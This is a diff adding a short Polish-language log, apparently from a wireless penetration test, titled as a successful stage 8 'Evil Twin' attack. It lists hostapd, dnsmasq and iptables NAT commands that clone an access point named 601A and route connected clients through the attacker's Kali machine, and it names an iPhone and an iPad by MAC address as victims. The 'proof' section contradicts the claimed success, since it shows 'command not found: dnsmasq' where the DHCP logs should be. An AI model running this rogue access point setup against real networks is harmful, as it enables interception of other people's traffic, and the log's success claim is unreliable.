@@ -1,0 +1,15 @@
+# ETAP 8 — Evil Twin 601A z DHCP + NAT (SUKCES)
+## Komendy
+hostapd -B /tmp/evil601a.conf (SSID=601A, WPA2-PSK, kanal 4)
+dnsmasq --interface=wlan0 --dhcp-range=192.168.200.50,192.168.200.150,12h
+iptables -t nat -A POSTROUTING -s 192.168.200.0/24 -o eth0 -j MASQUERADE
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+## Wynik
+Oba urzadzenia polaczyly sie z Evil Twin AP:
+- iPhone (BA:A1:0E:08:E0:35) → 192.168.200.127
+- iPad (1E:89:C2:FF:08:10) → 192.168.200.103
+DHCP dziala. NAT dziala. Internet dostepny przez eth0 Kali.
+## Dowod
+DHCP logi z dnsmasq:
+zsh:1: command not found: dnsmasq
+
